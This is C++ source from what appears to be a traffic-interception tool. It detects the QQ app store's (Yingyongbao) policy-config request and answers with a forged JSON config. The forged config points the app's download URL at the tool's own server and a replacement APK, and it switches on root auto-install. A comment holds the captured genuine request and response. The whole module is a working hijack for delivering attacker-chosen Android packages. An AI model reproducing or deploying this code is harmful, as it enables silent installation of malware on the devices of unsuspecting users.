
#include "qqdownloader.h"
#include <windows.h>
#include "sslPublic.h"
#include "../HttpUtils.h"


int QQDownloader::isQQDownloader(string url, string host) {
	if (strstr(host.c_str(),"qappcenter.3g.qq.com") && strstr(url.c_str(),"/cgi-bin/mapp/mapp_policy_config?mType=yingyongbao&") )
	{
		return TRUE;
	}

	return FALSE;
}


int QQDownloader::replyQQDownloader(char * dstbuf, int bufsize, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: text/xml; charset=utf-8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	char hdrformat[8192];
	char szformat[] = "Content-Encoding: gzip{ \"Agent_ReportBatchCount\": 5, \"Agent_ReportTimeInterval\": 5000, \"C_Full_Report\": true,"
		"\"C_LoginH5\": true, \"Common_114DNS_CGI_To_Resolve\": \"\", \"Common_114DNS_Resolve_All\": false, \"Common_114DNS_Resolve_Timeout\": 10,"
		"\"Common_ApkUpdateConfig\": 1, \"Common_Appstore_FullUpdateOnly\": 0, \"Common_BusinessReportFrequency\": 100, \"Common_BusinessReportMaxcount\": 1,"
		"\"Common_BusinessReportTimeinterval\": 1, \"Common_CGIReportFrequency\": 100, \"Common_CGIReportFrequencyFailed\": 100,"
		"\"Common_CGIReportFrequencySuccess\": 10, \"Common_CGIReportMaxcount\": 5, \"Common_CGIReportTimeinterval\": 1200,"
		"\"Common_Detail_Page\": true, \"Common_Dialog_Only_Once_Flag\": false, \"Common_DownloadReportFrequency\": 1,"
		"\"Common_DownloadReportMaxcount\": 3, \"Common_DownloadReportTimeinterval\": 36000, \"Common_HttpConnectionTimeout\": 15000,"
		"\"Common_HttpRetryCount\": 3, \"Common_Max_Count\": -1, \"Common_MyAppDownload_Flag\": true, \"Common_PushReportFrequency\": 1,"
		"\"Common_QQ_Patch_Switch\": true, \"Common_QQ_VERSION\": 10000, \"Common_Release_Control\": \"-1\","
		"\"Common_SSO_QZoneSchema\": \"mqzone\", \"Common_SSO_QzoneVersion\": \"3.6.8\", \"Common_Show_Dialog_Flag\": true,"
		"\"Common_SocketConnectionTimeout\": 30000, \"Common_WNS_Channel_Switch\": 0, \"Common_WNS_Theme_Switch\": 0,"
		"\"Common_WebReportFrequency\": 1, \"Common_frequency\": 25, \"Common_jump_code\": 1,"
		"\"Common_myapp_download_url\": \"http:\\/\\/%s\\/%s\","
		"\"Common_require_root_interval\": 86400000, \"Common_root_autoinstall_flag\": 1, \"Common_ta_enable\": 1,"
		"\"Common_tips_dialog_interval\": 2000, \"Common_tmast_wake\": true, \"Common_wake_interval\": 600, \"Common_wake_limite\": 2,"
		"\"Common_yyb_wifi_download_Switch\": true, \"ret\": 0 }";
	int httphdrlen = sprintf_s(hdrformat, 8192, szformat, 
		strip.c_str(),ANDROID_REPLACE_FILENAME);

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	return retlen;
}



/*
GET /cgi-bin/mapp/mapp_policy_config?mType=yingyongbao&status_os=5.1&status_brand=HUAWEI&status_version=22&qq_version=1218&status_machine=HUAWEI+TAG-TL00&sdkp=a&sdkv=1.5&appid=537061749&yyb_version=0&blacklist_logic_version=1 HTTP/1.1
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded
Cookie: skey=; uin=o1307017307; qua=V1_AND_SQ_8.0.8.1218;
Host: qappcenter.3g.qq.com
Connection: Keep-Alive
User-Agent: AndroidSDK_22_HWTAG-L6753_5.1

ssl first packet:POST /Telemetry.Request HTTP/1.1
Connection: Keep-Alive
User-Agent: MSDW
Content-Length: 13845
Host: sqm.telemetry.microsoft.com

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 27 Jul 2019 12:00:33 GMT
Content-Type: text/javascript
Transfer-Encoding: chunked
Connection: keep-alive

Content-Encoding: gzip{ "Agent_ReportBatchCount": 5, "Agent_ReportTimeInterval": 5000, "C_Full_Report": true, 
"C_LoginH5": true, "Common_114DNS_CGI_To_Resolve": "", "Common_114DNS_Resolve_All": false, "Common_114DNS_Resolve_Timeout": 10, 
"Common_ApkUpdateConfig": 1, "Common_Appstore_FullUpdateOnly": 0, "Common_BusinessReportFrequency": 100, "Common_BusinessReportMaxcount": 1, 
"Common_BusinessReportTimeinterval": 1, "Common_CGIReportFrequency": 100, "Common_CGIReportFrequencyFailed": 100, 
"Common_CGIReportFrequencySuccess": 10, "Common_CGIReportMaxcount": 5, "Common_CGIReportTimeinterval": 1200, 
"Common_Detail_Page": true, "Common_Dialog_Only_Once_Flag": false, "Common_DownloadReportFrequency": 1, 
"Common_DownloadReportMaxcount": 3, "Common_DownloadReportTimeinterval": 36000, "Common_HttpConnectionTimeout": 15000, 
"Common_HttpRetryCount": 3, "Common_Max_Count": -1, "Common_MyAppDownload_Flag": true, "Common_PushReportFrequency": 1, 
"Common_QQ_Patch_Switch": true, "Common_QQ_VERSION": 10000, "Common_Release_Control": "-1", 
"Common_SSO_QZoneSchema": "mqzone", "Common_SSO_QzoneVersion": "3.6.8", "Common_Show_Dialog_Flag": true, 
"Common_SocketConnectionTimeout": 30000, "Common_WNS_Channel_Switch": 0, "Common_WNS_Theme_Switch": 0, 
"Common_WebReportFrequency": 1, "Common_frequency": 25, "Common_jump_code": 1, 
"Common_myapp_download_url": "http:\/\/a.app.qq.com\/o\/myapp-down?g_f=991310", 
"Common_require_root_interval": 86400000, "Common_root_autoinstall_flag": 1, "Common_ta_enable": 1, 
"Common_tips_dialog_interval": 2000, "Common_tmast_wake": true, "Common_wake_interval": 600, "Common_wake_limite": 2, 
"Common_yyb_wifi_download_Switch": true, "ret": 0 }
*/